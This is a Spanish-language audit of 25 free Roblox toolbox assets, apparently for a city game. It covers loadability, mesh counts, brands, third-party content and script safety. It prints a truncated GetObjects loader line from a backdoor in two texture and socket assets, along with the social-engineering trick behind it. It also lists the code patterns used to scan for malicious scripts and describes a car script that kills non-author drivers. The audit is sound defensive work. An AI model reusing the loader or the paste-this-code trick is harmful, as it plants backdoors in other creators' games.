# Assets elegidos por Sebastián (3ª tanda): qué hay dentro

Igual que en `docs/assets-usuario-2.md`: volcado hecho en un servidor de Roblox con
`AssetService:LoadAssetAsync(id)` (con `pcall`).
Script: `scripts/cloud/assets-usuario-3.luau` → `bash scripts/cloud-test.sh -v assets-usuario-3`.
Se lanzó en 8 ejecuciones (cambiando `IDS`), porque la consola de la API solo guarda las ~5 000 últimas
líneas: el pack de coches va solo y con `CORTO` (sin lista de mallas).
Datos públicos de cada asset: `https://apis.roblox.com/toolbox-service/v1/items/details?assetIds=…`.
Las imágenes (Decal, texturas, miniaturas) se han mirado con `thumbnails.roblox.com`.
Fecha: 2026-10-01.

Notas generales:

- Los 25 ids **cargan** con `LoadAssetAsync`. Todos son **gratis** y de creadores con insignia de verificado
  (la insignia no dice nada de la calidad ni de la seguridad: ver 123553303846741 y 82042358715900).
- **Triángulos por malla**: no se pueden leer desde el servidor (ver la 2ª tanda). Los tris son los del toolbox.
- Las texturas de `SurfaceAppearance` y `MaterialVariant` no se pueden leer desde el servidor.
- Scripts: se leyó el `Source` de todos (2 200 en total; los repetidos se cuentan una vez) y se buscó
  `require(número)`, `getfenv`, `setfenv`, `loadstring`, `HttpService`, `MarketplaceService`,
  `TeleportService`, `InsertService`, `LoadAsset`, `string.char`/`string.reverse`, `\x`, `Kick`,
  `PlayerAdded`, `RemoteEvent`, `FireServer`/`FireClient`.
- **Hay 2 assets con virus** (mismo truco, ver abajo) y **2 coches con una trampa** del autor que mata al
  que se sienta. Están marcados ⛔.
- «carrocería / ruedas / cristales / asientos» se cuentan por el nombre de la pieza, su material y su
  transparencia; es aproximado (p. ej. el Camry cuenta como «cristal» muchas piezas medio transparentes).
- ⚠ = script: hay que borrarlo o revisarlo al usar el asset.

## Resumen

| id | Qué es | ¿Carga? | Piezas / tris (toolbox) | Scripts | Valoración |
|---|---|---|---|---|---|
| 9432856072 | Semi-Realistic Car Pack: 28 coches + 2 remolques con chasis A-Chassis | ✅ | 3 742 piezas (2 307 MeshPart) / 426 728 tris | ⚠ 2 010 | **útil con cuidado** — modelos bonitos y conducibles, pero todos con **marca y modelo real** (Toyota, Nissan, Dodge, GMC…), logos en Decals (Nissan, Toyota, Supra, Hellcat, Pontiac, Trueno, «藤原とうふ店» de Initial D) y ⛔ un script `Protector 2.0` en 2 coches que **mata** a cualquiera que no sea el autor. Usar solo carrocerías, cambiando nombres y quitando logos y scripts. |
| 113264079562085 | Realistic Factory Props Pack: carretilla elevadora, cintas, palés, cajas | ✅ | 399 MeshPart (todas PBR) / 242 918 tris | 0 | **útil** — limpio, sin scripts ni marcas. 120 cajas iguales: no hace falta meterlas todas. Nombres `_LOD0(copy)` / `Prefab_01`: parecen de un pack de Unity. |
| 8553512581 | «Realistic Pack» (RedWood Roleplay): rocas, árboles, flores, nieve, peces | ✅ | 223 MeshPart (213 SA) / 635 600 tris | ⚠ 11 (animaciones) | **útil** — son las piezas de naturaleza PBR de Roblox (las mismas que en la 2ª tanda). Scripts limpios (solo animan peces, mariposas y libélulas). |
| 13262637537 | realistic and grunge furniture pack: casa entera (cocina, dormitorios, luces) | ✅ | 613 piezas (487 MeshPart) / 335 912 tris | ⚠ 33 | **útil con cuidado** — la cocina, cómodas, sofás y lámparas son muy buenos (cajones y luces con ProximityPrompt). Pero mezcla cosas de terror (huesos, cuervos disecados, carteles de Dracula), props de Half-Life 2 (`metalbucket01a`, `Radiator 01a`…) y un `StarterCharacter`. |
| 103449549978145 | Realistic Graffiti Decoration Pack: 40 Decals de grafiti | ✅ | 39 Part + 40 Decal / 0 tris | 0 | **útil con cuidado** — la mayoría son firmas sin problema, pero hay grafitis de **CS:GO** y **Half-Life 2**, el logo de **Wu-Tang**, uno con un cartel de alquiler con **nombre y teléfono reales** y uno **bloqueado** por Roblox. Usar solo los de la lista buena. |
| 16879341926 | Mossy rock pack: 17 rocas con musgo | ✅ | 17 MeshPart (16 SA) / 136 289 tris | 0 | **útil** — rocas PBR limpias (Boulder, Nordic Cliff, RockBridge…). |
| 13388285234 | Realistic Terrain Asset Pack: recopilación enorme de naturaleza | ✅ | 1 702 piezas (1 640 MeshPart) / el toolbox no da tris | ⚠ 1 (ReadMe) | **útil con cuidado** — el propio autor dice que lo cogió «del toolbox». Hay de todo: palmeras, sauce, desierto, meseta, bajo el agua, comida… y mallas de Half-Life 2 (`bramble001a`, `tree_deciduous_01a`). Coger piezas sueltas. |
| 15004077857 | Realistic road pack: calzadas, puente, señales | ✅ | 76 piezas (19 MeshPart) / 11 411 tris | 0 | **útil con cuidado** — las **señales de tráfico** (STOP, prohibido, 20, 30, paso de peatones) y las alcantarillas valen; el cartel `c17billboard` y el puente son de **Half-Life 2** y hay un coche **GAZ-Volga** (marca real). |
| 117850698505269 | Realistic Gun Pack Kit: M4A1, AK, MP5, pistola + sistema de disparo | ✅ | 171 piezas / 274 006 tris | ⚠ 59 | **no usar** — armas reales con nombre real, efectos de **sangre y gore** (`BloodEffect`, `GoreEffect`) y un sistema de armas entero. No pega en una ciudad para todos. |
| 17519952806 | realistic filipino street food pack: 5 pinchos | ✅ | 20 piezas (16 MeshPart) | 0 | **útil** — balut, betamax, calamares, isaw, quek quek. Pequeños y limpios, sin texturas PBR. |
| 130843005739076 | Realistic Fish PACK: peces, tiburones, ballena, kraken | ✅ | 248 piezas (138 MeshPart) / 667 512 tris | ⚠ 20 | **útil con cuidado** — los peces sueltos (Cod, Grouper, Barramundi…) valen para una pescadería. El resto **no**: kraken, cocodrilo y un NPC que **hacen daño**, una escena de **Sketchfab** y un Mosasaurio `.smd` (sacado de un juego). |
| 11347783499 | City Pack/Realistic City: ciudad antigua de bloques | ✅ | 2 422 Part, 2 402 Decal / 290 132 tris | ⚠ 8 | **no usar** — ciudad de 2010 hecha con bloques y Decals; no se ve realista hoy. Solo trae ideas de Lighting. |
| 123159368741340 | Realistic Materials Pack: muestrario de 51 losetas | ✅ | 75 piezas, 283 Texture / 4 390 tris | 0 | **útil con cuidado** — a pesar del nombre, **no hay MaterialVariant**: son `Texture` antiguas (sin PBR). Solo sirve para copiar ids de imagen. |
| 4609898985 | Realistic Food pack: comida y bebidas | ✅ | 26 MeshPart / 93 210 tris | 0 | **útil con cuidado** — la comida vale, pero hay latas de **Coca-Cola** y **Pepsi** y una botella de **Coca-Cola** (marcas reales), y 3 texturas **bloqueadas** por Roblox. |
| 13877830677 | Realistic Landscape Pack: rocas, árboles, arbustos | ✅ | 431 piezas (321 MeshPart) / 1 176 412 tris | 0 | **útil** — rocas grandes y arbustos PBR. Muchos tris: usar pocas piezas. Hay mallas de Quixel (`…_LOD`). |
| 9802494780 | Small Realistic Mesh Pack: chimenea, torre eléctrica, depósitos | ✅ | 6 MeshPart / 9 704 tris | 0 | **útil** — props industriales ligeros (chimenea de 114,6 de alto, torre eléctrica de 93). |
| 100792423689137 | --Realistic Gun Pack--: M4A1, Vector, AK47, M1911 | ✅ | 390 Part / 10 652 tris | ⚠ 32 | **no usar** — armas reales, de bloques, con scripts de 2010 que ya no funcionan (todo en el cliente). |
| 13728551087 | Bipolaroid's Realistic Boats Pack: 11 barcos | ✅ | 45 piezas (41 MeshPart) / 513 953 tris | 0 | **útil con cuidado** — barcas, pesqueros, lancha y un barco hundido, todos **de decoración** (una malla por barco, sin asientos ni motor). Hay un **buque de guerra** de 314 studs y una «Smash Mouth Boat» (meme). |
| 16088161488 | Wessel Realistic road pack: 8 losetas de calle | ✅ | 8 Part / 132 tris | 0 | **útil con cuidado** — acera, bordillo y asfalto con `Texture` antiguas (sin PBR). Muy ligero. |
| 9262569938 | Realistic Rock Pack: 5 piedras pequeñas | ✅ | 5 MeshPart (SA) / 5 046 tris | 0 | **útil** — piedras de 1,5–4 studs, ~1 000 tris cada una, PBR. Perfectas para bordes de parque. |
| 13752145820 | Realistic Packs: 27 MaterialVariant | ✅ | 0 piezas, 27 MaterialVariant | 0 | **útil** — materiales PBR listos para MaterialService (baldosas, moqueta, ladrillo, césped, metal…). |
| 123553303846741 | Bloxburg Textures Pack | ✅ | 65 Part, 65 Texture | ⚠ 2 | **no usar** ⛔ — **virus** (ver abajo) y las texturas son **las de Bloxburg** (subidas por Coeptus, el creador de Bloxburg). |
| 7485807340 | Hyper-Realistic Night Pack: mapa de noche, cielo, lluvia | ✅ | 83 piezas (76 MeshPart) / 354 142 tris | ⚠ 14 | **útil con cuidado** — el `Sky` y el módulo de lluvia (Apache 2.0) valen. Los scripts fuerzan primera persona en un bucle, ponen niebla negra a las 00:00 y desenfoque; el mapa trae mallas de «Escape the school obby». |
| 82042358715900 | Wall socket decoration: un enchufe | ✅ | 1 MeshPart + 1 Part / 4 702 tris | ⚠ 2 | **no usar** ⛔ — **virus** (el mismo que el pack «Bloxburg»), aunque la descripción dice «No Scripts». |
| 8919681750 | Velvet's Realistic Nature Pack: árboles, rocas, nieve, texturas | ✅ | 693 piezas (687 MeshPart) / 1 019 106 tris | ⚠ 1 (README) | **útil con cuidado** — árboles muy buenos (abetos, pinos, robles, olmo…) pero pesados; el propio README dice que las texturas «las descargó» (de Quixel y otros). |

### Datos del toolbox

| id | Nombre | Creador | 👍/👎 | Tris | Vértices | MeshParts | Scripts | Decals | Audios | Tools | Precio | Creado |
|---|---|---|---|---|---|---|---|---|---|---|---|---|
| 9432856072 | Semi-Realistic Car Pack | SubXero_X ✔ | 64 / 36 | 426 728 | 1 048 574 | 2 307 | 1 926 | 1 547 | 592 | 0 | gratis | 2022-04-22 |
| 113264079562085 | Realistic Factory Props Pack | NyrexBLX ✔ | 0 / 0 | 242 918 | 236 077 | 399 | 0 | 0 | 0 | 0 | gratis | 2025-12-12 |
| 8553512581 | Realistic Pack | RedWood Roleplay GROUP ✔ | 39 / 1 | 635 600 | 465 485 | 223 | 11 | 0 | 0 | 0 | gratis | 2022-01-16 |
| 13262637537 | realistic and grunge furniture pack | wrygath ✔ | 67 / 3 | 335 912 | 310 190 | 487 | 33 | 29 | 46 | 0 | gratis | 2023-04-27 |
| 103449549978145 | Realistic Graffiti Decoration Pack | NyrexBLX ✔ | 0 / 0 | 0 | 0 | 0 | 0 | 40 | 0 | 0 | gratis | 2025-12-13 |
| 16879341926 | Mossy rock pack (REALISTIC) | m00nyx26 ✔ | 9 / 1 | 136 289 | 135 803 | 17 | 0 | 0 | 0 | 0 | gratis | 2024-03-26 |
| 13388285234 | Realistic Terrain Asset Pack | Draught Studios ✔ | 67 / 3 | (no lo da) | (no lo da) | — | — | — | — | — | gratis | 2023-05-08 |
| 15004077857 | Realistic road pack | wawalebossdu92 ✔ | 86 / 4 | 11 411 | 14 831 | 19 | 0 | 11 | 0 | 0 | gratis | 2023-10-08 |
| 117850698505269 | Realistic Gun Pack Kit | captain545745V2 ✔ | 4 / 6 | 274 006 | 497 384 | 107 | 37 | 6 | 107 | 4 | gratis | 2024-08-24 |
| 17519952806 | realistic filipino street food pack | celestoraz ✔ | 0 / 0 | (no lo da) | (no lo da) | — | — | — | — | — | gratis | 2024-05-17 |
| 130843005739076 | Realistic Fish PACK | SUS12e3a1 ✔ | 0 / 0 | 667 512 | 845 025 | 138 | 20 | 32 | 0 | 2 | gratis | 2024-12-25 |
| 11347783499 | City Pack/Realistic City | Mellany_xc ✔ | 29 / 11 | 290 132 | 245 708 | 0 | 8 | 2 402 | 1 | 0 | gratis | 2022-10-22 |
| 123159368741340 | Realistic Materials Pack | xManuTechPro_x64 ✔ | 0 / 0 | 4 390 | 6 222 | 22 | 0 | 18 | 0 | 0 | gratis | 2026-01-07 |
| 4609898985 | Realistic Food pack | Lambosil ✔ | 10 / 0 | 93 210 | 138 398 | 26 | 0 | 1 | 0 | 0 | gratis | 2020-01-18 |
| 13877830677 | Realistic Landscape Pack | LcsLaur ✔ | 0 / 0 | 1 176 412 | 1 003 822 | 321 | 0 | 80 | 1 | 0 | gratis | 2023-06-27 |
| 9802494780 | Small Realistic Mesh Pack | logoffkid ✔ | 0 / 0 | 9 704 | 16 619 | 6 | 0 | 0 | 0 | 0 | gratis | 2022-06-03 |
| 100792423689137 | --Realistic Gun Pack-- | ignapisito ✔ | 0 / 0 | 10 652 | 16 078 | 0 | 32 | 0 | 8 | 4 | gratis | 2026-01-19 |
| 13728551087 | Bipolaroid's Realistic Boats Pack | Bipolaroid ✔ | 0 / 0 | 513 953 | 583 567 | 41 | 0 | 576 | 0 | 0 | gratis | 2023-06-12 |
| 16088161488 | Wessel Realistic road pack | Iamplayingrobloxwes ✔ | 7 / 3 | 132 | 264 | 0 | 0 | 3 | 0 | 0 | gratis | 2024-01-23 |
| 9262569938 | Realistic Rock Pack | Necta Developments ✔ | 0 / 0 | 5 046 | 2 806 | 5 | 0 | 0 | 0 | 0 | gratis | 2022-04-02 |
| 13752145820 | Realistic Packs | kraloyunXDproo ✔ | 0 / 0 | 0 | 0 | 0 | 0 | 0 | 0 | 0 | gratis | 2023-06-14 |
| 123553303846741 | Bloxburg Textures Pack Realistic Modern Cozy Decor | y2lz1 ✔ | 0 / 0 | 910 | 1 820 | 0 | 2 | 0 | 0 | 0 | gratis | 2026-07-16 |
| 7485807340 | Hyper-Realistic Night Pack | Carcat62 ✔ | 0 / 0 | 354 142 | 1 047 866 | 76 | 13 | 2 | 0 | 0 | gratis | 2021-09-15 |
| 82042358715900 | 🌈 Wall socket decoration Realistic Pack | 0qcbp ✔ | 0 / 0 | 4 702 | 7 694 | 1 | 2 | 0 | 0 | 0 | gratis | 2026-06-29 |
| 8919681750 | Velvet's Realistic Nature Pack | xXDeathstrokeXx1 ✔ | 20 / 0 | 1 019 106 | 1 048 571 | 687 | 1 | 1 | 0 | 0 | gratis | 2022-02-24 |

(✔ = creador verificado. El toolbox cuenta como «scripts» solo Script y LocalScript, no los ModuleScript.
Los dos packs con virus, de 2026, llevan en la descripción una ristra de etiquetas de reclamo
— «Free Model, Premium, Trending, No Scripts…» —: una señal de alarma.)

## ⛔ El virus de 123553303846741 y 82042358715900

Los dos traen lo mismo, escondido detrás de un nombre inocente:

1. Un `Script` de 10 000 caracteres que se presenta como «Advanced Texture Streaming and Asset Management
   System v2.4.1». Casi todo es relleno falso (mipmaps, ruido Perlin…). Lo que hace de verdad:
   - Crea un `Message` en Workspace con el texto **«Error 501»** (lo saca de una etiqueta del script).
   - Copia una `ScreenGui` llamada `Credits` a StarterGui. Dentro hay un `TextBox` y un `LocalScript`.
2. El `LocalScript` lee un atributo `a` de un `PlaneConstraint`, le **da la vuelta al texto** (está
   escrito al revés para que no se vea) y lo pone en el `TextBox`.
3. Ese texto es código:
   `local s=game:GetObjects("rbxassetid://103102799768392")[1] … s.Parent=d` (en el enchufe, el id
   `124350878966495`): carga otro modelo y lo **esconde en la carpeta más profunda del juego**.
   `GetObjects` solo funciona en la barra de comandos de Studio: el truco es asustar con «Error 501» para
   que el creador **pegue ese código en Studio** y se meta él solo la puerta trasera.

No se ha cargado el modelo que intenta meter. **No usar estos dos assets ni copiar nada de ellos.** Si
alguna vez entran en el juego: borrarlos, buscar `GetObjects`, `PlaneConstraint` con atributos raros y
scripts «Texture Streaming», y no pegar nunca código que salga en pantalla.

## 9432856072 — Semi-Realistic Car Pack (SubXero_X)

Carga: ✅. Talla total 141.7 x 14.9 x 124.3. Clases principales: `MeshPart` 2 307, `Part` 1 084,
`Decal` 1 547, `Texture` 293, `SurfaceAppearance` 37, `Sound` 592, `LocalScript` 608, `Script` ~1 318,
`ModuleScript` 84, `VehicleSeat`/`Seat`, `HingeConstraint` 63, `ParticleEmitter` 283, `PointLight` 18.
Casi todos los coches usan **A-Chassis 6 (de //INSPARE)**: un chasis conducible con su interfaz.

### Los 30 vehículos

Talla en studs (X x Y x Z). «Carrocería» = piezas `Paint`/`Body`/`Color`… + piezas de puertas, capó,
maletero; «ruedas» = `Rim`, `Tire`, `Wheel` y similares (cuenta llantas, neumáticos y tapacubos);
«cristales» = material Glass, nombre glass/window o pieza medio transparente.

| Vehículo | Talla | Piezas | Carrocería | Ruedas | Cristales | Asientos | Scripts |
|---|---|---|---|---|---|---|---|
| 1969 Pontiac Firebird Formula 400 | 8.8x5.7x20.5 | 97 (58 MeshPart) | 9 | 11 | 13 | 5 | 69 |
| 2008 Toyota Camry LE | 21.3x6.4x10.8 | 189 (112) | 39 | 8 | 118 (*) | 4 | 49 |
| 1969 Dodge Charger R/T | 8.8x5.5x20.8 | 134 (80) | 10 | 9 | 29 | 5 | 93 |
| 1958 Plymouth Fury | 9.4x6.9x22.3 | 55 (50) | 12 (Door ×13) | 11 | 6 | 1 | 16 |
| 1999 Nissan Skyline R34 GT-R ⛔ | 8.5x5.4x20.6 | 233 (91) | 10 | 16 | 35 | 5 | 74 |
| 1980 Ford F-350 Coachmen | 26.5x11.9x10.8 | 27 (14) | 2 | 12 | 1 | 1 | 75 |
| 1991 Toyota Supra MK3 Turbo ⛔ | 8.7x5.4x19.0 | 339 (226) | 25 | 26 | 14 | 11 | 90 |
| 1998 Toyota Supra RZ Turbo | 8.1x5.5x18.6 | 142 (104) | 20 | 9 | 30 | 7 | 71 |
| 1998 Chevrolet Silverado C1500 | 23.0x10.3x7.5 | 120 (97) | 12 | 8 | 20 | 2 | 88 |
| 1998 GMC Sierra C2500 EC | 23.7x10.3x9.8 | 33 (14) | 1 | 8 | 2 | 4 | 77 |
| 1989 GMC Suburban | 32.3x11.2x8.8 | 121 (105) | 13 | 8 | 24 | 1 | 99 |
| 1988 GMC Sierra K1500 | 22.9x10.3x10.0 | 192 (159) | 21 | 9 | 31 | 2 | 101 |
| 1993 Chevrolet Silverado 454 SS | 20.8x10.3x8.1 | 140 (101) | 10 | 8 | 17 | 2 | 85 |
| 1995 Nissan Silvia S14 Zenki | 8.8x5.6x19.6 | 108 (67) | 20 (Paint) | 10 | 12 | 5 | 69 |
| 1986 Toyota Corolla AE86 Sprinter Trueno | 8.5x5.8x17.8 | 114 (72) | 14 (Paint) | 9 | 4 | 1 | 27 |
| 1987 Fleetwood Bounder RV (autocaravana) | 40.2x12.7x13.7 | 110 (45) | 9 (Exterior) | 4 | 11 | 6 | 75 |
| 1977 GMC MotorHome | 36.4x13.3x13.0 | 45 (26) | 2 | 7 | 1 | 5 | 89 |
| 2015 Dodge Challenger SRT Hellcat Redeye | 8.6x5.3x17.9 | 125 (80) | 14 | 9 | 11 | 5 | 72 |
| 2055 Dodge Challenger SRT Hellcat (coche volador, 184 TrianglePart) | 14.1x10.7x18.9 | 397 (87) | 7 | 4 | 20 | 5 | 70 |
| 1989 GMC Sierra C3500 | 26.2x11.3x10.0 | 200 (154) | 16 | 13 | 37 | 2 | 94 |
| 1988 GMC Sierra K1500 Z71 | 22.9x10.3x10.0 | 192 (159) | 18 | 9 | 30 | 2 | 100 |
| 2012 Dodge Challenger SRT-8 | 8.7x5.5x20.6 | 75 (29) | 1 | 8 | 16 | 5 | 82 |
| CarTrailer (remolque portacoches) | 12.0x3.7x39.2 | 39 (15) | 4 | 8 | 2 | 0 | 11 |
| CamperTrailer (caravana) | 10.1x13.4x26.1 | 86 (77) | 1 | 6 | 8 | 5 | 12 |
| 1996 Chevrolet Silverado C3500 CCLB | 27.4x11.1x7.7 | 58 (40) | 1 | 11 | 8 | 4 | 74 |
| 1989 GMC Sierra K3500 | 26.6x11.3x10.0 | 206 (160) | 16 | 13 | 44 | 2 | 94 |
| 1984 Chevrolet S-10 | 21.9x10.1x7.0 | 33 (9) | 0 | 8 | 1 | 1 | 76 |
| 1973 Dodge D-700 School Bus (autobús escolar) | 15.7x13.9x52.1 | 20 (15) | 4 | 2 | 1 | 2 | 17 |
| 1978 GMC Astro (With Container) (camión con contenedor) | 50.0x14.8x11.4 | 56 (31) | 1 | 32 | 2 | 2 | 30 |
| 1978 GMC Astro (With Flatbed) (camión plataforma) | 68.3x14.4x11.4 | 56 (30) | 1 | 32 | 2 | 2 | 31 |

(*) En el Camry muchas piezas del interior son medio transparentes y cuentan como «cristal».

Dónde está cada cosa (igual en casi todos): `Chassis/Body/Body/Paint` (carrocería pintable),
`…/Misc` (luces, logos, interior), `Wheels/FL, FR, RL, RR/Parts/{Rim, Tire}` (ruedas), `DriveSeat`
(asiento del conductor, `VehicleSeat`) y `Passenger…` (asientos), `A-Chassis Tune` (ajustes y plugins).

### Marcas y logos ⚠

- **Todos** los nombres son marca y modelo reales (Toyota, Nissan, Dodge, Pontiac, Plymouth, Ford,
  Chevrolet, GMC, Fleetwood) y las formas copian coches reales.
- Logos vistos en las imágenes de los Decals: **NISSAN** (`135553045` y `9006570790`), **TOYOTA**
  (`249347085`), **SUPRA** (`463207748`), **TRUENO** (`105166659`, `130853852`), **APEX TWIN CAM 16**
  (`105170387`), logo **Hellcat** (`8242816677`), flecha de **Pontiac** (`9002939634`), pegatinas
  «nuffsaid society» y «Untamed», y en el AE86 **«藤原とうふ店»** (la tienda de tofu del anime *Initial D*).
- Más logos dentro de mallas: piezas `GT-R Badge`, `gmcbadgel`/`gmc_badge`, `Badges`, `1500`, `Hellcat`
  en el volante, bocina `Momo …`, piloto «Rx Racing …».
- Matrícula japonesa (`296460823`) y placas sueltas.

### Scripts

- `Protector 2.0` (en el **Skyline R34** y el **Supra MK3**, ⛔): `Locked = true` y
  `Creator = "SubXero_X"`. Si se sienta al volante alguien que **no** es el autor, le pone una pantalla
  negra, **le mata** (`Health = 0`) y suena una alarma. El autor lo desbloquea escribiendo «Delock» en
  el chat. Es una trampa a favor del autor: **borrar siempre**.
- `AudioPlayerScript` (11 coches): radio que deja poner **cualquier id de audio** y lo oye todo el
  servidor (usa `MarketplaceService:GetProductInfo` solo para el nombre). Mejor quitarla.
- El resto es A-Chassis normal (`require` de sus propios módulos, `RemoteEvent` del coche,
  `FireServer` para luces y sonido). Ningún `require(número)`, `loadstring`, `getfenv`, `HttpService` ni `TeleportService`.
- Textos: interfaz de A-Chassis, un aviso en broma («Insurance isn't a thing in Roblox…») y
  «You're welcome. ;)» con el nombre del autor.

### Contenido

Las 178 piezas rojas son pilotos traseros y agujas del cuentakilómetros (no hay sangre).

## 113264079562085 — Realistic Factory Props Pack

Carga: ✅. Clases: `MeshPart` 399, `SurfaceAppearance` 399, `Model` 78. Sin scripts, Decals ni sonidos.

| Objeto | Talla | Piezas | Cuántos |
|---|---|---|---|
| `Forklift_01_Prefab_01` (carretilla elevadora) | 5.3x7.6x14.2 | 5 | 2 |
| `Pallet_Jack_01` (transpaleta) | 2.3x4.4x5.6 | 1 | 2 |
| `Handtruck_01` (carretilla de mano) | 1.8x4.4x1.9 | 1 | 2 |
| `Machine_01` (máquina) | 6.9x8.9x5.5 | 1 | 1 |
| Cintas transportadoras (`Conveyor_Belt_01_…`: 2m, 4m, curva 90°, diagonal, subida, bajada, final, soporte) | 2.1x0.6x7.2 … 3.8x3.0x3.8 | 1–3 | ~25 |
| `Pallet_01` / `Pallet_02` (palés) | 3.6x0.5x3.6 / 4.3x0.5x2.9 | 1 | 32 |
| Cajas de cartón (`Cardboard_Box_01/02/03`, `Box_Small_01a`, `Stack_Box_01/02`, `Box_Long_02a`) | 0.9x1.3x1.8 … 4.6x1.3x2.4 | 1 | ~270 |
| `Wrapped_Boxes_01` (palé con film) | 3.6x4.0x2.8 | 1 | 3 |
| `Drawer_01/02` (archivadores metálicos) | 2.1x4.0x1.5 | 1 | 4 |
| `Shipping_Crate_01a` (caja de madera) | 3.7x2.4x2.5 | 1 | 1 |

Sin marcas. Los nombres (`_LOD0(copy)`, `Prefab_01`) apuntan a un pack de Unity: el origen exacto no se sabe.

## 8553512581 — Realistic Pack (RedWood Roleplay)

Carga: ✅. Clases: `MeshPart` 223, `SurfaceAppearance` 213, `Model` 106, `Bone` 74, `Script` 11.
Talla total 488.4 x 193.5 x 856.0 (piezas sueltas en la raíz).

- Rocas: ~45 `MeshPart` de roca/terreno (7.8 … 136.6 studs), `LargeBoulder`, `LargeMossBoulder`
  (65.0x52.1x62.7), `LargeRiverBoulder`, `Nordic Cliff`, `RockBridge`, `Sand w Rocks` (136.6x16.4x75.5),
  `Terrain piece 1–4`, `MountainVar1/2`, `MediumIcebergVar1`, `SnowPile`.
- Árboles: `PalmtreeVar0/1` (24.2x36.9x24.2), `JapanwoodTree`, `BeechwoodTree` (13.3x25.3 … 65.6x78.4),
  `DogWoodTree`, `BroadLeafTree`, `MapleLeafTree` (47.0x32.4x44.7), `PineTreeVar0` (37.6x81.0x36.6),
  `RedwoodTree` (34.1x81.1 … 69.7x165.6), `RedwoodTreeSnowy` (71.9x171.0x70.0), y versiones `Dead…`.
- Suelo: `Bush`, `FlowerBush`, `Fern`, `CloverPatch`, `WildFlower`, `DenseLeafPatch`, ramas y palos, troncos caídos, tocón.
- Efectos: `ParticleEffect-LeavesFalling`, `RiverFlow`.
- Animales con script: 5 peces, 3 libélulas, 3 mariposas.

Son las piezas del pack de naturaleza de Roblox (las mismas que en la carpeta `Natural` de la 2ª tanda).

Scripts (11, ⚠ pero limpios): cada animal carga su animación (`6409208053`, `6409189944`… ) y la
reproduce. Nada más.

## 13262637537 — realistic and grunge furniture pack

Carga: ✅. Clases: `MeshPart` 487, `Part` 109, `SurfaceAppearance` 234, `Model` 183, `Script` 33,
`ProximityPrompt` 37, `PrismaticConstraint` 22, `Seat` 9, `Sound` 46, `PointLight` 14, `SpotLight` 8,
`ParticleEmitter` 19. Talla total 103.7 x 20.0 x 57.6.

Lo bueno (PBR, con nombres tipo `Furniture_…`):

- **Cocina** completa: `KitchenIsland` (12.9x4.5x8.5), muebles altos y bajos, esquinas, fregadero,
  lavavajillas, microondas, horno con llama (`Furniture_Kitchen_Oven`), campana, `Fridge_Normal`
  (frigorífico de 11.6x9.7x6.0 con puertas que se abren), `Kitchen_DiningTable` (9.7x3.0x4.8).
- **Dormitorio**: cama de matrimonio `KingBedFrame` (11.8x5.8x10.0, con asientos), cómodas altas y
  anchas (padres e hijos), mesillas, armario `Amoire_A`, cofre.
- **Salón**: sofás de cuadros (`Couch_Double_Plaid`, `Couch_Single_Plaid`, con «sentarse» por
  ProximityPrompt), `Furniture_Credenza_A`, `Furniture_Console_A`, mesas auxiliares, alfombras
  (`Shirvan Kilim`, `Khamseh Carpet`, `Swan House Carpet` de 35.0x24.6).
- **Luces** que se encienden y apagan con ProximityPrompt: lámpara de mesa, flexo, aplique, farol de
  porche, lámpara de techo, araña de comedor, focos empotrados.
- Cajones que se abren (22 `PrismaticConstraint` + sonidos `10013074619`/`10013075209`).

Lo que no pega en una ciudad normal o tiene otro origen:

- Terror: `Bones_Assortment` (huesos), `Wolf skull`, dos cuervos disecados, carteles de las películas
  *Dracula* y *White Zombie*, velas de ritual, `CorruptNotepad`, `Hugos_drawing` y un `TextLabel` con
  un texto de miedo («…She's slipping away and you're locked in your room… STOP AVO…»).
- Props de **Half-Life 2** (Valve): `metalbucket01a`, `Radiator 01a`, `Composite Garbage 1a`,
  `Pop Can 02a`, `Glass Bottle 1a`, `computer01_keyboard`, `Entity_benchoutdoor01a`.
- `StarterCharacter` (un avatar con orejas de conejo): borrar, cambia el personaje de todos.
- Mallas sin PBR de otros autores (`grunge table - eeriebun`, `Realistic old TV`, `Bed`, `Couch`…).

Scripts (33, ⚠; 11 distintos): abrir/cerrar cajones, sentarse en el sofá, abrir el frigorífico,
encender luces y velas. Solo encuentran `Destroy()` (para limpiar). Limpios.

## 103449549978145 — Realistic Graffiti Decoration Pack

Carga: ✅. 39 `Part` finas (77.8x44.7 en total) con 40 `Decal`. Sin scripts.
Se han mirado las 40 imágenes:

| Imagen | Nombre en el pack | Qué pone / se ve | ¿Usar? |
|---|---|---|---|
| `7019206180` | Graffiti 1 - this ones very good -olexo | **Bloqueada** por Roblox (no se ve) | ❌ |
| `345326569` | Decal | Grafitis + cartel «FOR LEASE» con **nombre y teléfono de una persona real** | ❌ |
| `3098573602` | WT 2 Graffiti | «WU-TANG» con la **W de Wu-Tang Clan** (logo de un grupo de música) | ❌ |
| `2629738446`, `2629746499`, `2629754614`, `2629758285`, `6970488963` | CS:GO - Graffiti 23/32/43/49, csgo graffiti 10 | Grafitis sacados de **Counter-Strike** | ❌ |
| `501057057`, `501058197`, `502182116` | HL2 Graffiti 2/3/5 | Grafitis sacados de **Half-Life 2** | ❌ |
| `4423922646` | Saints Graffiti 4 | «Saints» (recuerda al juego *Saints Row*) | con cuidado |
| `343168488` | sanic pls | firma negra (meme de Sonic en el nombre) | con cuidado |
| resto (24): `1078699847`, `1297260114`, `1335774378`, `1388254418`, `1410967229`, `1511156214`, `1511157511`, `1556478289`, `237334220`, `328481563`, `363250560`, `363251020`, `363251273`, `393302577`, `43315557`, `6968196415`, `8604374847`, `8604378617`, `8604383322`, `8604385209`, `8604388602`, `8604394415`, `896464818`, `89772442` | Graffiti, Seen, throwup, Graffiti14 («HAMBURG»), Graffiti7 («VANDALIZE ME!»), GostGraffiti2, NoExpectations, Rake43, Siah, SK, UOR… | Firmas y letras de colores sin marcas ni símbolos raros | ✅ |

No hay insultos, símbolos de odio ni dibujos para adultos en lo que se ve. Un `Decal` está vacío.

## 16879341926 — Mossy rock pack

Carga: ✅. 17 `MeshPart` (16 con SurfaceAppearance) en una `Folder`. Talla total 201.3 x 46.0 x 140.2.

| Roca | Cuántas | Talla |
|---|---|---|
| `Boulder` | 3 | 25.9x20.7x24.9 … 47.6x38.1x45.9 |
| `LargeBoulder` | 3 | 18.1x25.5x18.3 … 37.2x35.5x38.6 |
| `MeshPart` (sin nombre) | 3 | 9.3x9.8x9.8 … 10.2x8.6x10.8 |
| `Nordic Cliff` | 2 | 16.0x11.3x11.5 / 17.5x11.3x10.7 |
| `ROCK` | 2 | 16.7x10.5x16.5 |
| `Rock` | 2 | 18.8x11.0x19.5 / 50.0x26.9x43.0 |
| `RockBridge` (arco) | 1 | 23.4x3.7x18.9 |
